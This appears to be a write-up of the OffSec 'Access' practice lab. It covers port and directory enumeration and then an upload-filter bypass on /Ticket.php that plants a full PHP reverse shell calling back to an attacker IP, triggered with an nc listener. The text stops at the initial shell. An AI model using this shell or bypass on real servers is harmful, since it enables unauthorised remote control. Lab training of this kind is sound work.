---
title: OSCP Access - A Playground Practice machine
author: amandaguglieri
draft: false
TableOfContents: true
Date: 20250903
tags:
  - walkthrough
---

# OSCP Access - A Playground Practice machine


## Description

A foothold in the lab will be gained by leveraging a file upload function in a web application to upload a PHP web shell. Privileges will then be escalated to svc_mysql, abusing SeManageVolumePrivilege to achieve system access. This lab focuses on exploiting file upload vulnerabilities and privilege escalation methods.

```
export ip=192.168.156.187
```

## local.txt

```bash
nmap $ip
```

Output:

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

Deeper enumeration:

```bash
sudo nmap -p- -sC -sV $ip  -Pn
```

Output:

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-05 16:29:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_ssl-date: TLS randomness does not represent time
|_http-title: Access The Event
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49789/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-05T16:30:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: -59m50s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.55 seconds
```


```bash
echo "192.168.193.187    access.offsec" | sudo tee -a /etc/hosts
```


Footprint the application:

```bash
feroxbuster  --url http://access.offsec

```

Output:

```
                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://access.offsec
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      299c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      302c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       30w      340c http://access.offsec/uploads => http://access.offsec/uploads/
301      GET        9l       30w      339c http://access.offsec/assets => http://access.offsec/assets/
200      GET      211l      704w     9384c http://access.offsec/speaker-details.html
200      GET       95l      323w    24881c http://access.offsec/assets/img/speakers/3.jpg
200      GET        7l       27w     3309c http://access.offsec/assets/img/apple-touch-icon.png
200      GET      231l      534w     5571c http://access.offsec/assets/js/main.js
301      GET        9l       30w      338c http://access.offsec/forms => http://access.offsec/forms/
200      GET      116l      313w     2702c http://access.offsec/uploads/lolo.phtml.png
200      GET      246l     1273w   116208c http://access.offsec/assets/img/gallery/7.jpg
200      GET       16l       73w     6894c http://access.offsec/assets/img/supporters/5.png
200      GET        0l        0w        0c http://access.offsec/Ticket.php
200      GET        9l       23w      847c http://access.offsec/assets/img/favicon.png
200      GET       85l      210w     2731c http://access.offsec/assets/vendor/php-email-form/validate.js
200      GET       11l      114w     4745c http://access.offsec/assets/img/supporters/2.png
200      GET       13l      164w    15561c http://access.offsec/assets/vendor/swiper/swiper-bundle.min.css
200      GET        1l        8w       44c http://access.offsec/forms/contact.php
200      GET       10l       99w     7909c http://access.offsec/assets/img/logo.png
200      GET       11l       59w     3648c http://access.offsec/assets/img/supporters/6.png
200      GET       12l       59w     5756c http://access.offsec/assets/img/supporters/3.png
200      GET       90l      424w    28304c http://access.offsec/assets/img/speakers/6.jpg
403      GET       11l       47w      421c http://access.offsec/webalizer
200      GET        1l      636w    56222c http://access.offsec/assets/vendor/glightbox/js/glightbox.min.js
200      GET     1101l     3299w    49680c http://access.offsec/index.html
200      GET        8l       46w     3663c http://access.offsec/assets/img/supporters/7.png
200      GET        1l      313w    14690c http://access.offsec/assets/vendor/aos/aos.js
200      GET      211l     1112w    95274c http://access.offsec/assets/img/speakers/4.jpg
200      GET      246l     1013w    84182c http://access.offsec/assets/img/venue-gallery/2.jpg
200      GET        7l       35w     3419c http://access.offsec/assets/img/supporters/8.png
200      GET      215l     1210w   102996c http://access.offsec/assets/img/venue-gallery/8.jpg
200      GET       19l       89w     7068c http://access.offsec/assets/img/supporters/1.png
403      GET       11l       47w      421c http://access.offsec/phpmyadmin
200      GET      212l     1157w   103342c http://access.offsec/assets/img/gallery/6.jpg
200      GET        1l      218w    26053c http://access.offsec/assets/vendor/aos/aos.css
200      GET      116l      313w     2702c http://access.offsec/uploads/lala.php.jpg
200      GET      180l      968w    89020c http://access.offsec/assets/img/speakers/2.jpg
200      GET     1390l     6887w    65696c http://access.offsec/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET      116l      313w     2702c http://access.offsec/uploads/lele.phtml.png
200      GET        1l      235w    13785c http://access.offsec/assets/vendor/glightbox/css/glightbox.min.css
200      GET      116l      313w     2702c http://access.offsec/uploads/lala.php%250a.jpeg
200      GET     1420l     3293w    28380c http://access.offsec/assets/css/style.css
200      GET      458l     2538w   201364c http://access.offsec/assets/img/gallery/4.jpg
200      GET        7l     1031w    78129c http://access.offsec/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET      251l     1722w   153173c http://access.offsec/assets/img/gallery/1.jpg
200      GET      334l     2009w   182827c http://access.offsec/assets/img/venue-gallery/4.jpg
200      GET      111l      637w    54605c http://access.offsec/assets/img/speakers/5.jpg
200      GET      757l     4373w   377664c http://access.offsec/assets/img/hotels/2.jpg
200      GET      337l     2025w   158600c http://access.offsec/assets/img/gallery/8.jpg
200      GET      636l     3535w   284692c http://access.offsec/assets/img/venue-gallery/3.jpg
200      GET      625l     3807w   296795c http://access.offsec/assets/img/hotels/3.jpg
200      GET      458l     2673w   244263c http://access.offsec/assets/img/venue-gallery/6.jpg
200      GET      714l     4088w   328957c http://access.offsec/assets/img/gallery/3.jpg
200      GET      746l     4513w   316669c http://access.offsec/assets/img/hotels/1.jpg
200      GET      394l     2202w   192939c http://access.offsec/assets/img/gallery/2.jpg
200      GET      365l     2360w   198072c http://access.offsec/assets/img/venue-gallery/7.jpg
200      GET      670l     3700w   318743c http://access.offsec/assets/img/venue-info-bg.jpg
200      GET      486l     2732w   230254c http://access.offsec/assets/img/gallery/5.jpg
200      GET      591l     3458w   274149c http://access.offsec/assets/img/venue-gallery/5.jpg
200      GET      195l     1109w    79265c http://access.offsec/assets/img/speakers/1.jpg
200      GET       14l     1545w   135167c http://access.offsec/assets/vendor/swiper/swiper-bundle.min.js
200      GET      739l     4847w   308512c http://access.offsec/assets/img/about-bg.jpg
200      GET     2921l    17805w  1593873c http://access.offsec/assets/img/hero-bg.jpg
200      GET      591l     4489w   276191c http://access.offsec/assets/img/speakers/bizpage-preview.png
200      GET       39l       95w     8535c http://access.offsec/uploads/lala.png
200      GET      116l      313w     2702c http://access.offsec/uploads/lala.php.png
200      GET      116l      313w     2702c http://access.offsec/uploads/lala.phtml.png
200      GET      116l      313w     2702c http://access.offsec/uploads/lala.php.jpeg
200      GET       12l      104w     3807c http://access.offsec/assets/img/supporters/4.png
301      GET        9l       30w      362c http://access.offsec/assets/vendor/bootstrap-icons => http://access.offsec/assets/vendor/bootstrap-icons/
200      GET      435l     2796w   224281c http://access.offsec/assets/img/venue-gallery/1.jpg
200      GET     2424l    13928w  1167397c http://access.offsec/assets/img/subscribe-bg.jpg
301      GET        9l       30w      340c http://access.offsec/Uploads => http://access.offsec/Uploads/
301      GET        9l       30w      339c http://access.offsec/Assets => http://access.offsec/Assets/
200      GET      116l      313w     2702c http://access.offsec/Uploads/lolo.phtml.png
200      GET      116l      313w     2702c http://access.offsec/Uploads/lala.php.jpeg
200      GET      116l      313w     2702c http://access.offsec/Uploads/lala.php.png
200      GET       39l       95w     8535c http://access.offsec/Uploads/lala.png
200      GET      116l      313w     2702c http://access.offsec/Uploads/lele.phtml.png
200      GET      116l      313w     2702c http://access.offsec/Uploads/lala.phtml.png
200      GET      116l      313w     2702c http://access.offsec/Uploads/lala.php%250a.jpeg
200      GET      116l      313w     2702c http://access.offsec/Uploads/lala.php.jpg
200      GET        7l     2006w   163891c http://access.offsec/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET     1420l     3293w    28380c http://access.offsec/Assets/css/style.css
301      GET        9l       30w      338c http://access.offsec/Forms => http://access.offsec/Forms/
200      GET       10l       99w     7909c http://access.offsec/Assets/img/logo.png
200      GET        9l       23w      847c http://access.offsec/Assets/img/favicon.png
200      GET        7l       27w     3309c http://access.offsec/Assets/img/apple-touch-icon.png
503      GET       11l       44w      402c http://access.offsec/examples
200      GET        1l        8w       44c http://access.offsec/Forms/contact.php
200      GET       95l      323w    24881c http://access.offsec/Assets/img/speakers/3.jpg
200      GET     1101l     3299w    49680c http://access.offsec/
200      GET      211l     1112w    95274c http://access.offsec/Assets/img/speakers/4.jpg
200      GET      111l      637w    54605c http://access.offsec/Assets/img/speakers/5.jpg
200      GET      195l     1109w    79265c http://access.offsec/Assets/img/speakers/1.jpg
200      GET      757l     4373w   377664c http://access.offsec/Assets/img/hotels/2.jpg
200      GET      591l     4489w   276191c http://access.offsec/Assets/img/speakers/bizpage-preview.png
200      GET       12l       59w     5756c http://access.offsec/Assets/img/supporters/3.png
200      GET        7l       35w     3419c http://access.offsec/Assets/img/supporters/8.png
200      GET       19l       89w     7068c http://access.offsec/Assets/img/supporters/1.png
200      GET        8l       46w     3663c http://access.offsec/Assets/img/supporters/7.png
200      GET       12l      104w     3807c http://access.offsec/Assets/img/supporters/4.png
301      GET        9l       30w      368c http://access.offsec/assets/vendor/bootstrap-icons/fonts => http://access.offsec/assets/vendor/bootstrap-icons/fonts/
200      GET       16l       73w     6894c http://access.offsec/Assets/img/supporters/5.png
200      GET       11l      114w     4745c http://access.offsec/Assets/img/supporters/2.png
200      GET       11l       59w     3648c http://access.offsec/Assets/img/supporters/6.png
200      GET      636l     3535w   284692c http://access.offsec/Assets/img/venue-gallery/3.jpg
200      GET       90l      424w    28304c http://access.offsec/Assets/img/speakers/6.jpg
200      GET      246l     1013w    84182c http://access.offsec/Assets/img/venue-gallery/2.jpg
200      GET      215l     1210w   102996c http://access.offsec/Assets/img/venue-gallery/8.jpg
200      GET      625l     3807w   296795c http://access.offsec/Assets/img/hotels/3.jpg
200      GET      670l     3700w   318743c http://access.offsec/Assets/img/venue-info-bg.jpg
200      GET      180l      968w    89020c http://access.offsec/Assets/img/speakers/2.jpg
200      GET      334l     2009w   182827c http://access.offsec/Assets/img/venue-gallery/4.jpg
200      GET      435l     2796w   224281c http://access.offsec/Assets/img/venue-gallery/1.jpg
200      GET      746l     4513w   316669c http://access.offsec/Assets/img/hotels/1.jpg
200      GET      458l     2673w   244263c http://access.offsec/Assets/img/venue-gallery/6.jpg
200      GET     2921l    17805w  1593873c http://access.offsec/Assets/img/hero-bg.jpg
200      GET      365l     2360w   198072c http://access.offsec/Assets/img/venue-gallery/7.jpg
200      GET      591l     3458w   274149c http://access.offsec/Assets/img/venue-gallery/5.jpg
200      GET     2424l    13928w  1167397c http://access.offsec/Assets/img/subscribe-bg.jpg
200      GET      212l     1157w   103342c http://access.offsec/Assets/img/gallery/6.jpg
200      GET      251l     1722w   153173c http://access.offsec/Assets/img/gallery/1.jpg
200      GET      246l     1273w   116208c http://access.offsec/Assets/img/gallery/7.jpg
200      GET      337l     2025w   158600c http://access.offsec/Assets/img/gallery/8.jpg
200      GET      739l     4847w   308512c http://access.offsec/Assets/img/about-bg.jpg
200      GET       85l      210w     2731c http://access.offsec/Assets/vendor/php-email-form/validate.js
200      GET      394l     2202w   192939c http://access.offsec/Assets/img/gallery/2.jpg
200      GET       13l      164w    15561c http://access.offsec/Assets/vendor/swiper/swiper-bundle.min.css
200      GET        1l      313w    14690c http://access.offsec/Assets/vendor/aos/aos.js
200      GET        1l      218w    26053c http://access.offsec/Assets/vendor/aos/aos.css
200      GET      458l     2538w   201364c http://access.offsec/Assets/img/gallery/4.jpg
200      GET       14l     1545w   135167c http://access.offsec/Assets/vendor/swiper/swiper-bundle.min.js
301      GET        9l       30w      362c http://access.offsec/Assets/vendor/bootstrap-icons => http://access.offsec/Assets/vendor/bootstrap-icons/
200      GET      486l     2732w   230254c http://access.offsec/Assets/img/gallery/5.jpg
200      GET      231l      534w     5571c http://access.offsec/Assets/js/main.js
200      GET      714l     4088w   328957c http://access.offsec/Assets/img/gallery/3.jpg
301      GET        9l       30w      368c http://access.offsec/Assets/vendor/bootstrap-icons/fonts => http://access.offsec/Assets/vendor/bootstrap-icons/fonts/
403      GET       11l       47w      421c http://access.offsec/licenses
403      GET       11l       47w      421c http://access.offsec/server-status
301      GET        9l       30w      368c http://access.offsec/assets/vendor/bootstrap-icons/Fonts => http://access.offsec/assets/vendor/bootstrap-icons/Fonts/
301      GET        9l       30w      368c http://access.offsec/Assets/vendor/bootstrap-icons/Fonts => http://access.offsec/Assets/vendor/bootstrap-icons/Fonts/
301      GET        9l       30w      338c http://access.offsec/FORMS => http://access.offsec/FORMS/
200      GET        1l        8w       44c http://access.offsec/FORMS/contact.php
301      GET        9l       30w      340c http://access.offsec/UPLOADS
403      GET       11l       47w      421c http://access.offsec/server-info
[####################] - 43s    90308/90308   0s      found:152     errors:7      
[####################] - 43s    30000/30000   703/s   http://access.offsec/ 
[####################] - 2s     30000/30000   15275/s http://access.offsec/uploads/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   21708/s http://access.offsec/assets/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   15291/s http://access.offsec/assets/img/supporters/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   731707/s http://access.offsec/forms/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   128755/s http://access.offsec/assets/css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   150754/s http://access.offsec/assets/vendor/aos/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   33898/s http://access.offsec/assets/img/hotels/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   26502/s http://access.offsec/assets/img/gallery/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   136364/s http://access.offsec/assets/vendor/bootstrap/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   26293/s http://access.offsec/assets/vendor/glightbox/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   14859/s http://access.offsec/assets/img/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 0s     30000/30000   134529/s http://access.offsec/assets/vendor/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   44577/s http://access.offsec/assets/vendor/php-email-form/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s     30000/30000   30488/s http://access.offsec/assets/vendor/swiper/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   15881/s http://access.offsec/assets/img/venue-gallery/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s     30000/30000   19342/s http://access.offsec/assets/img/speakers/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 42s    30000/30000   718/s   http://access.offsec/assets/vendor/bootstrap-icons/ 
[####################] - 1s     30000/30000   33520/s http://access.offsec/assets/js/ => Directory listing (add --scan-dir-listings to scan)   
```

Navigate to http://access.offsec/index.html anc click on Bui Tickets. An upload feature is triggered.

![[access_01.png]]

Capture the upload request and upload a reverse shell:

```bash
POST /Ticket.php HTTP/1.1
Host: access.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------117003954342463478752894112743
Content-Length: 5453
Origin: http://access.offsec
Connection: keep-alive
Referer: http://access.offsec/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------117003954342463478752894112743
Content-Disposition: form-data; name="your-name"

lala
-----------------------------117003954342463478752894112743
Content-Disposition: form-data; name="your-email"

lala@lala.com
-----------------------------117003954342463478752894112743
Content-Disposition: form-data; name="ticket-type"

standard-access
-----------------------------117003954342463478752894112743
Content-Disposition: form-data; name="the_file"; filename="lala.png"
Content-Type: image/png

PNG

[CUT FOR BREVITY]
-----------------------------117003954342463478752894112743
Content-Disposition: form-data; name="submit"

Purchase
-----------------------------117003954342463478752894112743--

```

The response:

```
HTTP/1.1 200 OK
Date: Fri, 05 Sep 2025 18:02:59 GMT
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
X-Powered-By: PHP/8.0.7
Content-Length: 128
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<script type="text/javascript">alert("You will shortly recieve payment link mail");window.location.href = "index.html";</script>
```

The site is running Apache HTTP Server version 2.4.48, compiled for Windows 64-bit. The server has PHP version 8.0.7 enabled, most likely through mod_php or PHP-CGI.  If mod_php is in use, PHP vulnerabilities (like RCEs in certain functions or extensions) could directly compromise the web server. If HTTPS is enabled on port 443, outdated OpenSSL may allow weak ciphers or protocol downgrades.

Files are saved at  http://access.offsec/uploads as learn from feroxbuster enumeration.

Next natural step is uploading a php reverse shell, for instance [Ivan Sincek's](https://github.com/ivan-sincek/php-reverse-shell). Grab it from [revshells.com](https://www.revshells.com/). Note the modification of the extension and content-type to an allowable one:

```html
POST /Ticket.php HTTP/1.1
Host: access.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------229494136323803947671486484565
Content-Length: 10201
Origin: http://access.offsec
Connection: keep-alive
Referer: http://access.offsec/index.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="your-name"

lala
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="your-email"

lala@lala.com
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="ticket-type"

pro-access
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="the_file"; filename="lala.php9"
Content-Type: application/x-httpd-php


<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), // shell can read from STDIN
        1 => array('pipe', 'w'), // shell can write to STDOUT
        2 => array('pipe', 'w')  // shell can write to STDERR
    );
    private $buffer  = 1024;    // read/write buffer size
    private $clen    = 0;       // command length
    private $error   = false;   // stream read/write error
    public function __construct($addr, $port) {
        $this->addr = $addr;
        $this->port = $port;
    }
    private function detect() {
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS
            $this->os    = 'LINUX';
            $this->shell = 'sh';
        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        } else {
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";
        }
        return $detected;
    }
    private function daemonize() {
        $exit = false;
        if (!function_exists('pcntl_fork')) {
            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";
        } else if (($pid = @pcntl_fork()) < 0) {
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";
        } else if ($pid > 0) {
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";
        } else if (posix_setsid() < 0) {
            // once daemonized you will actually no longer see the script's dump
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";
        } else {
            echo "DAEMONIZE: Completed successfully!\n";
        }
        return $exit;
    }
    private function settings() {
        @error_reporting(0);
        @set_time_limit(0); // do not impose the script execution time limit
        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories
    }
    private function dump($data) {
        $data = str_replace('<', '&lt;', $data);
        $data = str_replace('>', '&gt;', $data);
        echo $data;
    }
    private function read($stream, $name, $buffer) {
        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";
        }
        return $data;
    }
    private function write($stream, $name, $data) {
        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream
            $this->error = true;                            // set global error flag
            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";
        }
        return $bytes;
    }
    // read/write method for non-blocking streams
    private function rw($input, $output, $iname, $oname) {
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length
            $this->dump($data); // script's dump
        }
    }
    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)
    // we must read the exact byte length from a stream and not a single byte more
    private function brw($input, $output, $iname, $oname) {
        $fstat = fstat($input);
        $size = $fstat['size'];
        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {
            // for some reason Windows OS pipes STDIN into STDOUT
            // we do not like that
            // we need to discard the data from the stream
            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {
                $this->clen -= $bytes;
                $size -= $bytes;
            }
        }
        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {
            $size -= $bytes;
            $this->dump($data); // script's dump
        }
    }
    public function run() {
        if ($this->detect() && !$this->daemonize()) {
            $this->settings();

            // ----- SOCKET BEGIN -----
            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {
                echo "SOC_ERROR: {$errno}: {$errstr}\n";
            } else {
                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS

                // ----- SHELL BEGIN -----
                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {
                    echo "PROC_ERROR: Cannot start the shell\n";
                } else {
                    foreach ($pipes as $pipe) {
                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS
                    }

                    // ----- WORK BEGIN -----
                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");
                    do {
						$status = proc_get_status($process);
                        if (feof($socket)) { // check for end-of-file on SOCKET
                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;
                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running
                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams
                        }                                                                    // use proc_get_status() instead
                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS
                        if ($num_changed_streams === false) {
                            echo "STRM_ERROR: stream_select() failed\n"; break;
                        } else if ($num_changed_streams > 0) {
                            if ($this->os === 'LINUX') {
                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            } else if ($this->os === 'WINDOWS') {
                                // order is important
                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET
                            }
                        }
                    } while (!$this->error);
                    // ------ WORK END ------

                    foreach ($pipes as $pipe) {
                        fclose($pipe);
                    }
                    proc_close($process);
                }
                // ------ SHELL END ------

                fclose($socket);
            }
            // ------ SOCKET END ------

        }
    }
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('192.168.45.236', 1234);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>
-----------------------------229494136323803947671486484565
Content-Disposition: form-data; name="submit"

Purchase
-----------------------------229494136323803947671486484565--

```

Set a listener in attacker machine:

```
nc -lnvp 1234
```

Execute the shell:

```bash
GET /uploads/lala.php1 HTTP/1.1
Host: access.offsec
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://access.offsec/uploads/
Upgrade-Insecure-Requests: 1
If-Modified-Since: Fri, 05 Sep 2025 17:11:26 GMT
If-None-Match: "a8e-63e10ed8df9bd"
Priority: u=0, i
```

Output:

```
HTTP/1.1 200 OK
Date: Sun, 07 Sep 2025 10:39:09 GMT
Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
Last-Modified: Sun, 07 Sep 2025 10:39:01 GMT
ETag: "24fa-63e33ade173de"
Accept-Ranges: bytes
Content-Length: 9466
Keep-Alive: timeout=5, max=99
Connection: Keep-Alive

<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.
// See the original script at https://github.com/pentestmonkey/php-reverse-shell.
class Shell {
    private $addr  = null;
    private $port  = null;
    private $os    = null;

[CUT FOR BREVITY]   
```

